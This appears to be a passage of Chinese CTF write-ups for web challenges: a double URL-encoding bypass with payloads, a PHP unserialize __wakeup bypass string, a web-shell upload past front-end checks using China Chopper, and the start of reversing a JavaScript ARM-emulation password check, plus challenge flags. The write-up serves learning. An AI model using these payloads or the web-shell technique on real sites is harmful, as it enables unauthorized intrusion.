<p>需要传一个id参数，参数经过url解码后是“admin”就能通过验证。把“admin”进行url编码得到“%61%64%6d%69%6e”，输入参数后在传输过程中就会被默认解码成“admin”导致进入第一个if判断。所以需要对“admin”进行二次url编码，得到“%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65”，添加到id参数访问后即可得到flag。或者进行部分url编码，以下playload都可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 全字符二次编码，后端接收到参数为：%61%64%6D%69%6E</span><br>index.php?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45<br><span class="hljs-comment"># 一次编码后只对“%”编码，后端接收到参数为：%61%64%6D%69%6E</span><br>index.php?id=%2561%2564%256d%2569%256e<br><span class="hljs-comment"># 对“a”进行全字符二次编码，后端接收到参数为：%61dmin</span><br>index.php?id=%25%36%31dmin<br><span class="hljs-comment"># 对“a”编码后再对“%”编码，后端接收到参数为：%61dmin</span><br>index.php?id=%2561dmin<br></code></pre></td></tr></table></figure>
<p>最后返回的flag为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;e15fa8dc6bdeaa1cdb95becc6077a6d2&#125;<br></code></pre></td></tr></table></figure>

<p>工具：<a href="http://stool.chinaz.com/hex" target="_blank" rel="noopener">在线url编码</a></p>
<h2 id="0x015-unserialize3"><a href="#0x015-unserialize3" class="headerlink" title="0x015 unserialize3"></a>0x015 unserialize3</h2><p>打开后显示源码和参数提示，题目名提示“反序列化”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure>
<p>执行php代码得到序列化后的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);<br>&#125;&#125;<br><br>$a=<span class="hljs-keyword">new</span> xctf();<br><span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-comment">// O:4:"xctf":1:&#123;s:4:"flag";s:3:"111";&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>得到序列化后的字符串后修改“属性个数”绕过__wakeup函数的执行，把xctf后面的1改为大于1的数就可以，访问 ?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;} 得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;34c226ebec3434cf4ee31e09720d510b&#125;<br></code></pre></td></tr></table></figure>

<p>工具：<a href="http://c.runoob.com/compile/1" target="_blank" rel="noopener">代码在线调试</a></p>
<h2 id="0x016-upload1"><a href="#0x016-upload1" class="headerlink" title="0x016 upload1"></a>0x016 upload1</h2><p>查看网页源码，发现是文件上传前端校验，选择php一句话，无视弹窗，审查元素删掉上传按钮的“disabled”属性，上传后返回文件路径，连上菜刀在web根目录发现flag.php，打开得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;99d355fbf6d800cb41c57efd2a15312a&#125;<br></code></pre></td></tr></table></figure>
<p>工具：<a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">中国菜刀</a></p>
<h2 id="0x017-baby-web"><a href="#0x017-baby-web" class="headerlink" title="0x017 baby_web"></a>0x017 baby_web</h2><p>打开浏览器开发者工具，Network勾选Preserve log，访问根目录，在第一个请求的返回头里发现flag，就是这么简单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;very_baby_web&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x018-Triangle"><a href="#0x018-Triangle" class="headerlink" title="0x018 Triangle"></a>0x018 Triangle</h2><p>查看网页源码得到登录执行的代码，还有需要区分谷歌/火狐浏览器分别赋值的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// toDataURL firefox vs chrome &gt;:O</span><br><span class="hljs-keyword">if</span>(navigator.userAgent.toLowerCase().indexOf(<span class="hljs-string">'firefox'</span>) &gt; <span class="hljs-number">-1</span>)&#123;<br>    <span class="hljs-keyword">var</span> o1 =  [<span class="hljs-number">220</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">5</span>, <span class="hljs-number">189</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">24</span>, <span class="hljs-number">249</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">8</span>, <span class="hljs-number">300</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">219</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">162</span>, <span class="hljs-number">178</span>, <span class="hljs-number">60</span>, <span class="hljs-number">8</span>, <span class="hljs-number">517</span>, <span class="hljs-number">857</span>, <span class="hljs-number">60</span>, <span class="hljs-number">485</span>, <span class="hljs-number">517</span>, <span class="hljs-number">53</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">219</span>, <span class="hljs-number">79</span>, <span class="hljs-number">497</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">130</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">36</span>, <span class="hljs-number">517</span>, <span class="hljs-number">460</span>, <span class="hljs-number">497</span>, <span class="hljs-number">25</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">642</span>, <span class="hljs-number">485</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">295</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">189</span>, <span class="hljs-number">900</span>, <span class="hljs-number">497</span>, <span class="hljs-number">295</span>, <span class="hljs-number">300</span>, <span class="hljs-number">72</span>, <span class="hljs-number">497</span>, <span class="hljs-number">36</span>, <span class="hljs-number">8</span>, <span class="hljs-number">40</span>, <span class="hljs-number">642</span>, <span class="hljs-number">484</span>, <span class="hljs-number">131</span>, <span class="hljs-number">131</span>, <span class="hljs-number">520</span>, <span class="hljs-number">295</span>, <span class="hljs-number">1</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">189</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">162</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">249</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">300</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">517</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">253</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">74</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">219</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>] ;<br><br>    <span class="hljs-keyword">var</span> o2 =  [<span class="hljs-number">24</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">80</span>, <span class="hljs-number">414</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">5</span>, <span class="hljs-number">439</span>, <span class="hljs-number">105</span>, <span class="hljs-number">419</span>, <span class="hljs-number">8</span>, <span class="hljs-number">447</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">104</span>, <span class="hljs-number">891</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">330</span>, <span class="hljs-number">192</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">64</span>, <span class="hljs-number">63</span>, <span class="hljs-number">64</span>, <span class="hljs-number">381</span>, <span class="hljs-number">25</span>, <span class="hljs-number">91</span>, <span class="hljs-number">632</span>, <span class="hljs-number">155</span>, <span class="hljs-number">25</span>, <span class="hljs-number">91</span>, <span class="hljs-number">632</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">1</span>, <span class="hljs-number">76</span>, <span class="hljs-number">381</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">417</span>, <span class="hljs-number">891</span>, <span class="hljs-number">70</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">414</span>, <span class="hljs-number">82</span>, <span class="hljs-number">381</span>, <span class="hljs-number">70</span>, <span class="hljs-number">447</span>, <span class="hljs-number">555</span>, <span class="hljs-number">381</span>, <span class="hljs-number">176</span>, <span class="hljs-number">8</span>, <span class="hljs-number">139</span>, <span class="hljs-number">419</span>, <span class="hljs-number">220</span>, <span class="hljs-number">141</span>, <span class="hljs-number">141</span>, <span class="hljs-number">635</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">414</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">439</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">447</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">91</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">63</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">693</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">46</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>, <span class="hljs-number">8</span>, <span class="hljs-number">105</span>, <span class="hljs-number">105</span>, <span class="hljs-number">192</span>] ;<br><br>    <span class="hljs-keyword">var</span> o3 =  [<span class="hljs-number">105</span>, <span class="hljs-number">134</span>, <span class="hljs-number">235</span>, <span class="hljs-number">31</span>, <span class="hljs-number">530</span>, <span class="hljs-number">39</span>, <span class="hljs-number">39</span>, <span class="hljs-number">105</span>, <span class="hljs-number">817</span>, <span class="hljs-number">1</span>, <span class="hljs-number">53</span>, <span class="hljs-number">479</span>, <span class="hljs-number">479</span>, <span class="hljs-number">97</span>, <span class="hljs-number">479</span>, <span class="hljs-number">160</span>, <span class="hljs-number">693</span>, <span class="hljs-number">54</span>, <span class="hljs-number">479</span>, <span class="hljs-number">31</span>, <span class="hljs-number">498</span>, <span class="hljs-number">817</span>, <span class="hljs-number">479</span>, <span class="hljs-number">530</span>, <span class="hljs-number">674</span>, <span class="hljs-number">335</span>, <span class="hljs-number">597</span>, <span class="hljs-number">90</span>, <span class="hljs-number">134</span>, <span class="hljs-number">134</span>, <span class="hljs-number">134</span>, <span class="hljs-number">344</span>] ;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">var</span> o1 =  [<span class="hljs-number">305</span>, <span class="hljs-number">8</span>, <span class="hljs-number">485</span>, <span class="hljs-number">346</span>, <span class="hljs-number">5</span>, <span class="hljs-number">394</span>, <span class="hljs-number">485</span>, <span class="hljs-number">346</span>, <span class="hljs-number">24</span>, <span class="hljs-number">460</span>, <span class="hljs-number">485</span>, <span class="hljs-number">346</span>, <span class="hljs-number">8</span>, <span class="hljs-number">172</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">177</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">112</span>, <span class="hljs-number">349</span>, <span class="hljs-number">822</span>, <span class="hljs-number">8</span>, <span class="hljs-number">372</span>, <span class="hljs-number">86</span>, <span class="hljs-number">822</span>, <span class="hljs-number">286</span>, <span class="hljs-number">372</span>, <span class="hljs-number">106</span>, <span class="hljs-number">619</span>, <span class="hljs-number">63</span>, <span class="hljs-number">177</span>, <span class="hljs-number">61</span>, <span class="hljs-number">619</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">60</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">64</span>, <span class="hljs-number">372</span>, <span class="hljs-number">317</span>, <span class="hljs-number">619</span>, <span class="hljs-number">25</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">346</span>, <span class="hljs-number">286</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">619</span>, <span class="hljs-number">63</span>, <span class="hljs-number">394</span>, <span class="hljs-number">226</span>, <span class="hljs-number">619</span>, <span class="hljs-number">63</span>, <span class="hljs-number">172</span>, <span class="hljs-number">591</span>, <span class="hljs-number">619</span>, <span class="hljs-number">64</span>, <span class="hljs-number">8</span>, <span class="hljs-number">40</span>, <span class="hljs-number">346</span>, <span class="hljs-number">618</span>, <span class="hljs-number">148</span>, <span class="hljs-number">148</span>, <span class="hljs-number">104</span>, <span class="hljs-number">63</span>, <span class="hljs-number">1</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">394</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">112</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">460</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">172</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">372</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">526</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">217</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">485</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>, <span class="hljs-number">8</span>, <span class="hljs-number">177</span>, <span class="hljs-number">485</span>, <span class="hljs-number">259</span>] ;<br><br>    <span class="hljs-keyword">var</span> o2 =  [<span class="hljs-number">24</span>, <span class="hljs-number">8</span>, <span class="hljs-number">355</span>, <span class="hljs-number">223</span>, <span class="hljs-number">317</span>, <span class="hljs-number">515</span>, <span class="hljs-number">355</span>, <span class="hljs-number">223</span>, <span class="hljs-number">5</span>, <span class="hljs-number">195</span>, <span class="hljs-number">355</span>, <span class="hljs-number">223</span>, <span class="hljs-number">8</span>, <span class="hljs-number">250</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">287</span>, <span class="hljs-number">431</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">8</span>, <span class="hljs-number">200</span>, <span class="hljs-number">379</span>, <span class="hljs-number">101</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">203</span>, <span class="hljs-number">170</span>, <span class="hljs-number">203</span>, <span class="hljs-number">268</span>, <span class="hljs-number">25</span>, <span class="hljs-number">287</span>, <span class="hljs-number">678</span>, <span class="hljs-number">199</span>, <span class="hljs-number">25</span>, <span class="hljs-number">287</span>, <span class="hljs-number">678</span>, <span class="hljs-number">268</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">76</span>, <span class="hljs-number">268</span>, <span class="hljs-number">8</span>, <span class="hljs-number">287</span>, <span class="hljs-number">1205</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">8</span>, <span class="hljs-number">19</span>, <span class="hljs-number">268</span>, <span class="hljs-number">101</span>, <span class="hljs-number">515</span>, <span class="hljs-number">1446</span>, <span class="hljs-number">268</span>, <span class="hljs-number">101</span>, <span class="hljs-number">250</span>, <span class="hljs-number">186</span>, <span class="hljs-number">268</span>, <span class="hljs-number">198</span>, <span class="hljs-number">8</span>, <span class="hljs-number">337</span>, <span class="hljs-number">223</span>, <span class="hljs-number">81</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>, <span class="hljs-number">119</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">515</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">195</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">250</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">287</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">170</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">184</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">617</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>, <span class="hljs-number">8</span>, <span class="hljs-number">355</span>, <span class="hljs-number">355</span>, <span class="hljs-number">379</span>] ;<br><br>    <span class="hljs-keyword">var</span> o3 =  [<span class="hljs-number">52</span>, <span class="hljs-number">853</span>, <span class="hljs-number">58</span>, <span class="hljs-number">31</span>, <span class="hljs-number">908</span>, <span class="hljs-number">39</span>, <span class="hljs-number">39</span>, <span class="hljs-number">52</span>, <span class="hljs-number">197</span>, <span class="hljs-number">1</span>, <span class="hljs-number">86</span>, <span class="hljs-number">786</span>, <span class="hljs-number">786</span>, <span class="hljs-number">370</span>, <span class="hljs-number">786</span>, <span class="hljs-number">79</span>, <span class="hljs-number">177</span>, <span class="hljs-number">343</span>, <span class="hljs-number">786</span>, <span class="hljs-number">31</span>, <span class="hljs-number">106</span>, <span class="hljs-number">197</span>, <span class="hljs-number">786</span>, <span class="hljs-number">908</span>, <span class="hljs-number">331</span>, <span class="hljs-number">344</span>, <span class="hljs-number">227</span>, <span class="hljs-number">491</span>, <span class="hljs-number">853</span>, <span class="hljs-number">853</span>, <span class="hljs-number">853</span>, <span class="hljs-number">496</span>] ;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-keyword">var</span> input = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'password'</span>).value;<br>	<span class="hljs-keyword">var</span> enc = enc_pw(input);<br>	<span class="hljs-keyword">var</span> pw = get_pw();<br>	<span class="hljs-keyword">if</span>(test_pw(enc, pw) == <span class="hljs-number">1</span>)&#123;<br>		alert(<span class="hljs-string">'Well done!'</span>);<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		alert(<span class="hljs-string">'Try again ...'</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>其中用到的函数都在secret.js中，美化后代码为</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_pw</span>(<span class="hljs-params">e, _</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> t = stoh(atob(getBase64Image(<span class="hljs-string">"eye"</span>))),<br>        r = <span class="hljs-number">4096</span>,<br>        m = <span class="hljs-number">8192</span>,<br>        R = <span class="hljs-number">12288</span>,<br>        a = <span class="hljs-keyword">new</span> uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);<br>    a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, <span class="hljs-number">4096</span>, uc.PROT_ALL);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]);<br>    a.mem_map(m, <span class="hljs-number">4096</span>, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, <span class="hljs-number">4096</span>, uc.PROT_ALL), a.mem_write(R, stoh(e));<br>    <span class="hljs-keyword">var</span> u = r,<br>        c = r + o1.length;<br>    <span class="hljs-keyword">return</span> a.emu_start(u, c, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), a.reg_read_i32(uc.ARM_REG_R5)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enc_pw</span>(<span class="hljs-params">e</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> _ = stoh(atob(getBase64Image(<span class="hljs-string">"frei"</span>))),<br>        t = <span class="hljs-number">4096</span>,<br>        r = <span class="hljs-number">8192</span>,<br>        m = <span class="hljs-number">12288</span>,<br>        R = <span class="hljs-keyword">new</span> uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);<br>    R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, <span class="hljs-number">4096</span>, uc.PROT_ALL);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]);<br>    R.mem_map(r, <span class="hljs-number">4096</span>, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, <span class="hljs-number">4096</span>, uc.PROT_ALL);<br>    <span class="hljs-keyword">var</span> o = t,<br>        u = t + o2.length;<br>    <span class="hljs-keyword">return</span> R.emu_start(o, u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), htos(R.mem_read(m, e.length))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_pw</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> e = stoh(atob(getBase64Image(<span class="hljs-string">"templar"</span>))), _ = <span class="hljs-string">""</span>, t = <span class="hljs-number">0</span>; t &lt; o3.length; t++) _ += <span class="hljs-built_in">String</span>.fromCharCode(e[o3[t]]);<br>    <span class="hljs-keyword">return</span> _<br>&#125;<br></code></pre></td></tr></table></figure>
<p>函数get_pw返回固定值”XYzaSAAX_PBssisodjsal_sSUVWZYYYb”，下面暂不分析。由上面代码共三个主要函数：enc_pw、get_pw、test_pw，三个数组：o1、o2、o3。三个数组分别只在一个函数中调用了，而且都是先“write”定值数组，再“write”输入的变量参数，数组应该是arm的指令，取指令的hex</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> o1 =  [<span class="hljs-number">220</span>, <span class="hljs-number">8</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">5</span>, <span class="hljs-number">189</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">24</span>, <span class="hljs-number">249</span>, <span class="hljs-number">440</span>, <span class="hljs-number">642</span>, <span class="hljs-number">8</span>, <span class="hljs-number">300</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">219</span>, <span class="hljs-number">440</span>, <span class="hljs-number">280</span>, <span class="hljs-number">8</span>, <span class="hljs-number">162</span>, <span class="hljs-number">178</span>, <span class="hljs-number">60</span>, <span class="hljs-number">8</span>, <span class="hljs-number">517</span>, <span class="hljs-number">857</span>, <span class="hljs-number">60</span>, <span 